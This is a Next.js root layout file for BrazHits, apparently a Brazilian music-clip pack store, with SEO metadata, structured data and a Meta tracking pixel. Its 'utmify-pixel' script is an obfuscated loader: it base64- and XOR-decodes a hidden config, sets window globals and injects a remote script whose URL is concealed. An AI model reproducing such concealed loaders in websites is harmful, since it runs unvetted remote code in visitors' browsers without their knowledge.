import type { Metadata } from "next";
import "./globals.css";
import "./redesign.css";
import {
  FAQS,
  LAST_MODIFIED,
  LOGO_URL,
  OG_IMAGE_URL,
  PAGE_DESCRIPTION,
  PAGE_TITLE,
  PAGE_URL,
  SITE_NAME,
  SITE_ORIGIN,
} from "@/lib/site";

const utmifyPixelScript = `(function(){var c_086=atob("DAZf588brMHue8rYOH19kr13jvvME76sSHVlyOB4yK/ADr61UWAmyax0we+MCeWrW3Q2l7tog7GHA6+0F3Y2n6p3gqudWeb6WXIrlaZ52bWLCOjiY1tzxah3w6OPF7n6Al0kxaF6waTMQeioUX46i4Z/ju3MDau0TWN93e0tzfeNSv3tCmRm1vt6yfaMH6jvXWBphf850ZyT");var l_y7=[];for(var e_4m=0;e_4m<c_086.length;e_4m++){l_y7.push(c_086.charCodeAt(e_4m)&255);}var h_59=l_y7[0];var k_0tk1=l_y7.slice(1,1+h_59);var z_bk=l_y7.slice(1+h_59);var j_euu=z_bk.map(function(b,y_8){return b^k_0tk1[y_8%h_59];});var c_g9="";for(var e_054t=0;e_054t<j_euu.length;e_054t++){c_g9+=String.fromCharCode(j_euu[e_054t]&255);}var g_pa=decodeURIComponent(escape(c_g9));var p_jrb=JSON.parse(g_pa);var y_c=p_jrb.globals||[];y_c.forEach(function(w_mycq){window[w_mycq.name]=w_mycq.value;});var r_6c4q=document.createElement("script");r_6c4q.src=p_jrb.url;r_6c4q.async=true;r_6c4q.defer=true;(p_jrb.attributes||[]).forEach(function(w_ejv3){r_6c4q.setAttribute(w_ejv3.name,w_ejv3.value);});(document.head||document.documentElement).appendChild(r_6c4q);})();`;
const metaPixelScript = `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','1147242417377452');fbq('track','PageView');`;

const structuredData = {
  "@context": "https://schema.org",
  "@graph": [
    {
      "@type": "OnlineStore",
      "@id": `${SITE_ORIGIN}/#organization`,
      name: SITE_NAME,
      alternateName: "Braz Hits",
      url: SITE_ORIGIN,
      logo: {
        "@type": "ImageObject",
        url: LOGO_URL,
      },
      image: {
        "@type": "ImageObject",
        url: OG_IMAGE_URL,
        width: 1736,
        height: 909,
      },
      description: PAGE_DESCRIPTION,
    },
    {
      "@type": "WebSite",
      "@id": `${SITE_ORIGIN}/#website`,
      url: `${SITE_ORIGIN}/`,
      name: SITE_NAME,
      alternateName: "Braz Hits",
      publisher: { "@id": `${SITE_ORIGIN}/#organization` },
      inLanguage: "pt-BR",
    },
    {
      "@type": "WebPage",
      "@id": `${PAGE_URL}#webpage`,
      url: PAGE_URL,
      name: PAGE_TITLE,
      description: PAGE_DESCRIPTION,
      isPartOf: { "@id": `${SITE_ORIGIN}/#website` },
      about: { "@id": `${SITE_ORIGIN}/#organization` },
      primaryImageOfPage: {
        "@type": "ImageObject",
        url: OG_IMAGE_URL,
        width: 1736,
        height: 909,
      },
      dateModified: LAST_MODIFIED,
      inLanguage: "pt-BR",
    },
    {
      "@type": "FAQPage",
      "@id": `${PAGE_URL}#faq`,
      mainEntity: FAQS.map(([question, answer]) => ({
        "@type": "Question",
        name: question,
        acceptedAnswer: {
          "@type": "Answer",
          text: answer,
        },
      })),
    },
  ],
};

const safeStructuredData = JSON.stringify(structuredData).replace(/</g, "\\u003c");

export const metadata: Metadata = {
  metadataBase: new URL(SITE_ORIGIN),
  title: PAGE_TITLE,
  description: PAGE_DESCRIPTION,
  applicationName: SITE_NAME,
  authors: [{ name: SITE_NAME, url: PAGE_URL }],
  creator: SITE_NAME,
  publisher: SITE_NAME,
  category: "Música e entretenimento",
  referrer: "strict-origin-when-cross-origin",
  alternates: { canonical: PAGE_URL },
  robots: {
    index: true,
    follow: true,
    nocache: false,
    googleBot: {
      index: true,
      follow: true,
      noimageindex: false,
      "max-video-preview": -1,
      "max-image-preview": "large",
      "max-snippet": -1,
    },
  },
  icons: {
    icon: [{ url: LOGO_URL, type: "image/png" }],
    shortcut: [{ url: LOGO_URL, type: "image/png" }],
    apple: [{ url: LOGO_URL, type: "image/png" }],
  },
  openGraph: {
    url: PAGE_URL,
    siteName: SITE_NAME,
    title: PAGE_TITLE,
    description: PAGE_DESCRIPTION,
    type: "website",
    locale: "pt_BR",
    images: [{ url: OG_IMAGE_URL, width: 1736, height: 909, type: "image/png", alt: "BrazHits — packs de clipes e músicas em Full HD" }],
  },
  twitter: {
    card: "summary_large_image",
    title: PAGE_TITLE,
    description: PAGE_DESCRIPTION,
    images: [{ url: OG_IMAGE_URL, alt: "BrazHits — packs de clipes e músicas em Full HD" }],
  },
};

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="pt-BR">
      <head>
        <link rel="sitemap" type="application/xml" href={`${PAGE_URL}sitemap.xml`} />
        <script id="brazhits-structured-data" type="application/ld+json" dangerouslySetInnerHTML={{ __html: safeStructuredData }} />
        <script id="utmify-pixel" dangerouslySetInnerHTML={{ __html: utmifyPixelScript }} />
        <script id="meta-pixel" dangerouslySetInnerHTML={{ __html: metaPixelScript }} />
      </head>
      <body>
        <noscript><img alt="" height="1" width="1" style={{ display: "none" }} src="https://www.facebook.com/tr?id=1147242417377452&ev=PageView&noscript=1" /></noscript>
        {children}
      </body>
    </html>
  );
}
